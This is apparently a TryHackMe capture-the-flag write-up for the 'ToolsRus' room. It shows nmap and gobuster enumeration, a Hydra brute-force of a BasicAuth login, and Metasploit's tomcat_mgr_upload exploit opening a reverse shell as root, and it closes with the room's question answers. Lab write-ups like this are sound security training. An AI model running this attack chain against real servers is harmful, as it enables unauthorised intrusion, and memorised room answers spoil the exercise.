# ToolsRus | TryHackMe

## Overview
- **Room:** ToolsRus  
- **Difficulty:** Easy  
- **Date:** <your_date_here>  
- **Tags:** Enumeration, Brute-force, Tomcat, Metasploit  

---

## Enumeration

### Nmap
```bash
nmap -sC -sV -oN nmap_toolsrus.txt <IP>
```

**Open Ports:**
- 22/tcp - SSH  
- 80/tcp - HTTP  
- 1234/tcp - Apache Tomcat  

---

### Website (Port 80)
Checked the main page → nothing useful.  

Ran gobuster:  
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

**Findings:**
- `/guidelines` → revealed username **bob**  
- `/protected` → required credentials (BasicAuth)  

---

### Hydra (Brute-force)
Brute-forced password for bob:  
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt <IP> http-get /protected/
```

**Result:**  
`bob : bubbles`

---

## Tomcat (Port 1234)

Service enumeration:  
```bash
nmap -sC -sV -p1234 <IP>
```
→ Apache Tomcat/7.0.88  

Checked Tomcat Manager with Nikto:  
```bash
nikto -host http://<IP>:1234/manager/html -id bob:bubbles
```
→ Valid access confirmed  

---

## Exploitation

Used Metasploit:  
```bash
msfconsole
search tomcat_mgr_upload
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <IP>
set RPORT 1234
set HttpUsername bob
set HttpPassword bubbles
set TARGETURI /manager/html
set LHOST <your_IP>
run
```

Shell obtained:  
```bash
whoami
root
```

---

## Privilege Escalation
Already had root access directly via the exploit.  

---

## Flags
```bash
cd /root
cat flag.txt
```
✅ Root flag retrieved  

---

## Answers to Room Questions
1. **What port is Tomcat running on?** → `1234`  
2. **What is the username found on the website?** → `bob`  
3. **What is bob’s password?** → `bubbles`  
4. **What version of Apache Tomcat is running?** → `7.0.88`  
5. **What exploit was used to gain access?** → `tomcat_mgr_upload`  
6. **What is the user flag?** → Found in `/root/flag.txt`  

---

## Lessons Learned
- `gobuster` helps find hidden directories.  
- Hydra is useful for brute-forcing BasicAuth.  
- Apache Tomcat Manager is dangerous if default creds are guessed.  
- The `tomcat_mgr_upload` Metasploit module provides direct root access.  
